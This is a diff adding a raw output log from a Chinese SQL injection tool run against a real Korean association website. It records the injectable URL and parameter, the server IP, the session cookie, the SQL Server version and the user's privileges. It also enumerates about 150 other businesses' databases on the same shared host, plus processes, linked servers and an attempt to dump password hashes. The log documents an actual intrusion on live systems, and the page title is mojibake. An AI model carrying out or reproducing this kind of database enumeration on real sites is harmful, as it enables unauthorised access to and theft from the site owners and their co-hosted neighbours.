@@ -1,0 +1,218 @@
+■漏洞信息:============================================================
+ ·URL:http://www.kauic.or.kr/Notice/notice3_view.asp?pg=20&find_sel=&find_str=&snum=2017
+ ·页面标题：KAUIC *茄惫措切沥焊拳蛆狼雀*
+ ·参数:pg=20&find_sel=&find_str=&snum=2017
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.47.66.77
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 05:25:38 GMT
+X-Powered-By: ASP.NET
+Content-Length: 10183
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDSQDRSQTQ=LIHGGGPDBINCNAACMLJJJGHM; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：kauic_or_kr
+- 用户名：kauic_or_kr
+- 版本：Microsoft SQL Server  2000 - 8.00.2055 (Intel X86) 
+	Dec 16 2008 19:46:53 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：SQL11
+- 服务名：MSSQLSERVER
+- 系统用户名：kauic_or_kr
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+100bogam_co_kr	F:\Userdatabase\100bogam_co_kr_Dat.MDF	
+admin_skinaria_com	F:\UserDatabase\admin_skinaria_com_dat.mdf	
+air-sale_co_kr	F:\UserDatabase\air-sale_co_kr_dat.mdf	
+allimi_or_kr	F:\Userdatabase\allimi_or_kr_Dat.MDF	
+angelsday_co_kr	F:\Userdatabase\angelsday_co_kr_Dat.MDF	
+apable_co_kr	F:\Userdatabase\apable_co_kr_Dat.MDF	
+arinmhc_com	F:\UserDatabase\arinmhc_com_dat.mdf	
+arooa_com	F:\Userdatabase\arooa_com_Dat.MDF	
+ashkorea_com	F:\UserDatabase\ashkorea_com_dat.mdf	
+bageul_co_kr	F:\Userdatabase\bageul_co_kr_Dat_Dat.MDF	
+bbarunbag_com	F:\UserDatabase\bbarunbag_com_dat.mdf	
+betterworld_or_kr	F:\Userdatabase\betterworld_or_kr_Dat.MDF	
+beyondon_com	F:\Userdatabase\beyondon_com_Dat.MDF	
+bigantinternational_com	F:\UserDatabase\bigantinternational_com_dat.mdf	
+casscientech_com	F:\Userdatabase\casscientech_com_Dat.MDF	
+castlebridge_co_kr	F:\Userdatabase\castlebridge_co_kr_Dat.MDF	
+catoz_com	F:\Userdatabase\catoz_com_Dat.MDF	
+ceje_co_kr	F:\Userdatabase\ceje_co_kr_dat.mdf	
+childcounsel_co_kr	F:\Userdatabase\childcounsel_co_kr_Dat.MDF	
+chokwangdia_com	F:\Userdatabase\chokwangdia_com_dat.mdf	
+chungtaesan_co_kr	F:\UserDatabase\chungtaesan_co_kr_dat.mdf	
+cj21_co_kr	F:\Userdatabase\cj21_co_kr_Dat.MDF	
+ck1_co_kr	F:\Userdatabase\ck1_co_kr_Dat.MDF	
+comins_co_kr	F:\Userdatabase\comins_co_kr_dat.mdf	
+consteng_co_kr	F:\Userdatabase\consteng_co_kr_dat.mdf	
+crizen_sql_co_kr	F:\UserDatabase\crizen_sql_co_kr_dat.mdf	
+crosspoint_co_kr	f:\userdatabase\crosspoint_co_kr_Dat.MDF	
+cstmaster_com	F:\UserDatabase\cstmaster_com_dat.mdf	
+daearesort_com	F:\Userdatabase\daea_resort_test_Data.MDF	
+daejilawbiz_com	F:\Userdatabase\daejilawbiz_com_Dat.MDF	
+dahanoomall_com	F:\Userdatabase\dahanoomall_com_dat.mdf	
+dbworks_co_kr	F:\Userdatabase\dbworks_co_kr_Dat.mdf	
+dentalbanobagi_com	F:\Userdatabase\dentalbanobagi_com_Dat.MDF	
+dknt_co_kr	F:\UserDatabase\dknt_co_kr_dat.mdf	
+dm8245_com	F:\UserDatabase\dm8245_com_dat.mdf	
+dmprinting_co_kr	F:\Userdatabase\dmprinting_co_kr_Dat.MDF	
+documeeting_com	F:\Userdatabase\documeeting_com_Data.MDF	
+dolmaji_com	F:\Userdatabase\dolmaji_com_Dat_Dat.MDF	
+dominopia_com	F:\Userdatabase\dominopia_com_Dat_Dat.MDF	
+dsitec_com	F:\Userdatabase\dsitec_com_Dat.MDF	
+dysbank_co_kr	F:\Userdatabase\dysbank_co_kr_dat.MDF	
+easyeng_co_kr	F:\UserDatabase\easyeng_co_kr_dat.mdf	
+ecobiz21_co_kr	F:\Userdatabase\ecobiz21_co_kr_Dat.MDF	
+eenansystem_com	F:\Userdatabase\eenansystem_com_Dat.MDF	
+elbizsoft_co_kr	F:\Userdatabase\elbizsoft_co_kr_Dat.MDF	
+e-mrp_com	F:\Userdatabase\e-mrp_com_Dat_Dat.MDF	
+enaegabo_co_kr	F:\UserDatabase\enaegabo_co_kr_dat.mdf	
+enssol_co_kr	F:\Userdatabase\enssol_co_kr_Dat.MDF	
+esself_co_kr	F:\Userdatabase\esself_co_kr_Dat.MDF	
+euisami_kr	F:\Userdatabase\euisami_kr_Dat.MDF	
+eutteum_net	F:\UserDatabase\eutteum_net_dat.mdf	
+ever-on_co_kr	F:\Userdatabase\ever-on_co_kr_Dat_Dat.MDF	
+footkiss_net	F:\Userdatabase\footkiss_net_dat.mdf	
+fswan_net	F:\Userdatabase\fswan_net_Dat.MDF	
+ftp_yycts_co_kr	F:\Userdatabase\ftp_yycts_co_kr_Dat.MDF	
+funfuneng_co_kr	F:\Userdatabase\funfuneng_co_kr_dat.mdf	
+gagubada_net	F:\Userdatabase\gagubada_net_Dat.MDF	
+galleryillum_co_kr	F:\Userdatabase\galleryillum_co_kr_Dat.MDF	
+gamesdisplay_co_kr	F:\Userdatabase\gamesdisplay_co_kr_Dat.MDF	
+gcosmo_co_kr	F:\Userdatabase\gcosmo_co_kr_Dat.MDF	
+globalstudents_co_kr	F:\UserDatabase\globalstudents_co_kr_dat.mdf	
+gnglogix_com	F:\Userdatabase\gnglogix_com_Dat.MDF	
+gohanvit_com	F:\UserDatabase\gohanvit_com_dat.mdf	
+googoo_co_kr	F:\Userdatabase\googoo_co_kr_Dat.MDF	
+greenbell_or_kr	F:\UserDatabase\greenbell_or_kr_dat.mdf	
+hanacoach_net	F:\UserDatabase\hanacoach_net_dat.mdf	
+hand4u_co_kr	F:\Userdatabase\hand4u_co_kr_Dat.MDF	
+hangxiparts_com	F:\Userdatabase\hangxiparts_com_Dat.MDF	
+haso_co_kr	F:\Userdatabase\haso_co_kr_dat.mdf	
+health-love_com	F:\Userdatabase\health-love_com_Dat_Dat.MDF	
+hllife_co_kr	F:\UserDatabase\hllife_co_kr_dat.mdf	
+hncinfo_com	F:\Userdatabase\hncinfo_com_Dat.MDF	
+homdex_com	F:\Userdatabase\homdex_com_Dat.MDF	
+homdex_net	F:\Userdatabase\homdex_net_Dat.MDF	
+home_worldforms_com	F:\UserDatabase\home_worldforms_com_dat.mdf	
+htcmembers_com	F:\Userdatabase\htcmembers_com_dat.mdf	
+hyungsang_or_kr	F:\Userdatabase\hyungsang_or_kr_dat.mdf	
+ibae_or_kr	F:\UserDatabase\ibae_or_kr_dat.mdf	
+ibookoffice_co_kr	F:\Userdatabase\ibookoffice_co_kr_Dat.MDF	
+iccm18_org	F:\UserDatabase\iccm18_org_dat.mdf	
+icm2012_org	F:\UserDatabase\icm2012_org_dat.mdf	
+icmetro205_com	F:\UserDatabase\icmetro205_com_dat.mdf	
+idhnetworks_com	F:\UserDatabase\idhnetworks_com_dat.mdf	
+idongsungsa_com	F:\UserDatabase\idongsungsa_com_dat.mdf	
+iflan_co_kr	F:\Userdatabase\iflan_co_kr_Dat.MDF	
+ilovegideon_org	F:\Userdatabase\ilovegideon_org_Dat.MDF	
+ilovesmoking_co_kr	F:\Userdatabase\ilovesmoking_co_kr_Dat.MDF	
+indiestory_org	F:\Userdatabase\indiestory_org_Dat_Dat.MDF	
+infomold_com	F:\UserDatabase\infomold_com_dat.mdf	
+innopace_co_kr	F:\UserDatabase\innopace_co_kr_dat.mdf	
+insulinpump_or_kr	F:\Userdatabase\insulinpump_or_kr_Dat.MDF	
+interway-tarp_com	F:\Userdatabase\interway_Data.MDF	
+itheroom_com	F:\UserDatabase\itheroom_com_dat.mdf	
+ivyjewelry_com	F:\UserDatabase\ivyjewelry_com_dat.mdf	
+jaruad_co_kr	F:\Userdatabase\jaruad_co_kr_Dat.MDF	
+jcaf_or_kr	F:\Userdatabase\jcaf_or_kr_Dat_Dat.MDF	
+jejuweek_co_kr	F:\Userdatabase\jejuweek_co_kr_Dat.MDF	
+jijung_co_kr	F:\Userdatabase\jijung_co_kr_Dat_Dat.MDF	
+jjang_asia	F:\UserDatabase\jjang_asia_dat.mdf	
+jsdnm_com	F:\UserDatabase\jsdnm_com_dat.mdf	
+kabbed_com	F:\UserDatabase\kabbed_com_dat.mdf	
+kankokutown_com	F:\Userdatabase\kankokutown_com_Dat.MDF	
+kauic_or_kr	F:\Userdatabase\kauic_or_kr_Dat.MDF	
+kbstalent_com	F:\UserDatabase\kbstalent_com_dat.mdf	
+kcia_or_kr	F:\UserDatabase\kcia_or_kr_dat.mdf	
+keb_re_kr	F:\Userdatabase\keb_re_kr_dat.mdf	
+kgenc_co_kr	F:\Userdatabase\kgenc_co_kr_Dat.MDF	
+kgenergy_co_kr	F:\UserDatabase\kgenergy_co_kr_dat.mdf	
+kimchifestival_org	F:\UserDatabase\kimchifestival_org_dat.mdf	
+kingofking_pe_kr	F:\UserDatabase\kingofking_pe_kr_dat.mdf	
+knpm-info_com	F:\Userdatabase\knpm-info_com_Dat.MDF	
+knstd_com	F:\Userdatabase\knstd_com_Dat.MDF	
+kos_or_kr	F:\Userdatabase\kos_or_kr_Dat.MDF	
+kpeet_or_kr	F:\UserDatabase\kpeet_or_kr_dat.mdf	
+krdata_co_kr	f:\userdatabase\krdata_co_kr_Dat.MDF	
+ksde_co_kr	F:\Userdatabase\ksde_co_kr_Dat.MDF	
+ktcfamily_org	F:\Userdatabase\ktcfamily_org_Dat.MDF	
+kunwon_com	F:\Userdatabase\kunwon_com_Dat.MDF	
+lawhanbando_com	F:\Userdatabase\lawhanbando_com_Dat.MDF	
+lepsilon_com	F:\UserDatabase\lepsilon_com_dat.mdf	
+lookat_co_kr	F:\UserDatabase\lookat_co_kr_dat.mdf	
+lovedays_co_kr	F:\UserDatabase\lovedays_co_kr_dat.mdf	
+loveistory_com	F:\Userdatabase\loveistory_com_Dat.MDF	
+marizinwedding_co_kr	F:\Userdatabase\marizinwedding_co_kr_Dat.MDF	
+master	f:\MSSQL\data\master.mdf	
+mathink_org	F:\UserDatabase\mathink_org_dat.mdf	
+mcga_co_kr	F:\Userdatabase\mcga_co_kr_dat.mdf	
+mdex_or_kr	F:\Userdatabase\mdex_or_kr_Dat.MDF	
+mdstec_com	F:\Userdatabase\mdstec_com_Dat.MDF	
+medbook_co_kr	F:\Userdatabase\medbook_co_kr_Dat_Dat.MDF	
+minimed_co_kr	F:\UserDatabase\minimed_co_kr_dat.mdf	
+minttalking_com	F:\Userdatabase\minttalking_com_Dat.MDF	
+misolife_kr	F:\Userdatabase\misolife_kr_Dat.MDF	
+model	f:\MSSQL\data\model.mdf	
+momsnet_co_kr	F:\Userdatabase\momsnet_co_kr_Dat.MDF	
+moonia_co_kr	F:\UserDatabase\moonia_co_kr_dat.mdf	
+msdb	f:\MSSQL\data\msdbdata.mdf	
+nccore_com	F:\UserDatabase\nccore_com_dat.mdf	
+newen_co_kr	F:\Userdatabase\newen_co_kr_Dat_Dat.MDF	
+nhtj_com	F:\Userdatabase\nhtj_com_Dat.MDF	
+nhtkorea_com	F:\Userdatabase\nhtkorea_com_Dat.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLDMO_1	sleeping	SQL11	4420	AWAITING COMMAND	SYSTEM	
+SQLAgent - Generic Refresher	sleeping	SQL11	2108	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	SQL11	2108	AWAITING COMMAND	SYSTEM	
+PowerBuilder	sleeping	SSUNGWK-PC	4184	AWAITING COMMAND		
+MS SQLEM	sleeping	SQL11	3128	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+SQL11	SQL Server	SQLOLEDB	SQL11		SQL11	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+一次性获取失败，正在批次获取……
